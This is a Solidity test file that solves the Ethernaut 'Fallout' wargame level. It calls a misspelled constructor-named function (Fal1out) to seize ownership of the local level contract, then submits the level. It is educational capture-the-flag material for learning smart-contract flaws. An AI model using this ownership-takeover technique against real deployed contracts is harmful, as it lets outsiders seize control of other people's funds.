pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Fallout/FalloutFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract Template is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testFalloutHack() public {
        vm.deal(eoaAddress, 1 ether);
        /////////////////
        // LEVEL SETUP //
        /////////////////

        // create the factory
        FalloutFactory falloutFactory = new FalloutFactory();

        // register the level
        ethernaut.registerLevel(falloutFactory);

        // start pranking the user
        vm.startPrank(eoaAddress);

        // instantiate the level
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));
        emit log_named_address(
            "Fallout owner before: ",
            ethernautFallout.owner()
        );

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        /*
            This is example is for solidity < 0.4.21 where the constructor
            function had the same name as the Contract. In the event where it 
            was mispelled, the constructor just becomes a public function, callable
            by anyone.
        */
        ethernautFallout.Fal1out{value: 10 wei}();
        emit log_named_address(
            "Fallout owner after: ",
            ethernautFallout.owner()
        );
        assertEq(ethernautFallout.owner(), eoaAddress);
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
